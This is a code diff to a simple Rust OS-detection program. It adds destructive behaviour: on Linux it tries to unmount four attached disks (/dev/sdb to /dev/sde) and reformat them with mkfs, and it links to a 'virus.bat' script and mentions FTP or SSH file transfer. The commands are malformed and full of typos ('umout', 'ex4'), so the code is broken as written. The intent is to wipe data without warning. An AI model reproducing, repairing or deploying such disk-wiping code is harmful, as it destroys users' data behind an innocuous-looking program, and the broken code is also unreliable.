@@ -1,11 +1,11 @@
+// https://github.com/zxcV32/unlimited-folders-on-windows-desktop/blob/master/virus.bat
+
 use std::process::Command;
  
 
 fn main() {
     if cfg!(target_os = "windows") {
         println!("Running on Windows!");
-        // Add Windows-specific code here
-        // https://github.com/zxcV32/unlimited-folders-on-windows-desktop/blob/master/virus.bat
         
         // need to echo Hello From echotest.bat >> ./init.bat
         // FTP or SSH file transfer
@@ -16,11 +16,39 @@ fn main() {
 
     } else if cfg!(target_os = "linux") {
         println!("Running on Linux!");
-        // Add Linux-specific code here
-        // https://stackoverflow.com/questions/40613898/how-to-force-immediate-writes-to-a-disk-from-our-own-driver-on-linux
         // mounted disk can't write. Its always busy. So I choose to unmounte some Mounted disk and
-        // do reformat that
+        // "lsblk -f"
 
+        let output= Command::new("umout /dev/sdb")
+            .output()
+            .expect("Filed");
+        let output= Command::new("umout /dev/sdc")
+            .output()
+            .expect("Filed");
+        let output= Command::new("umout /dev/sdd")
+            .output()
+            .expect("Filed");
+        let output= Command::new("umout /dev/sde")
+            .output()
+            .expect("Filed");
+
+        // output.status.success()
+
+        // do reformat that
+        let output= Command::new("sudo mkfs -t ex4 /dev/sdb")
+            .output()
+            .expect("Filed");
+        let output= Command::new("sudo mkfs -t ex4 /dev/sdc")
+            .output()
+            .expect("Filed");
+        let output= Command::new("sudo mkfs -t ex4 /dev/sdd")
+            .output()
+            .expect("Filed");
+        let output= Command::new("sudo mkfs -t ex4 /dev/sde")
+            .output()
+            .expect("Filed");
+
+        // rust lang String handling way is so hard to me :(
     } else {
         println!("Running on an unsupported OS!");
     }
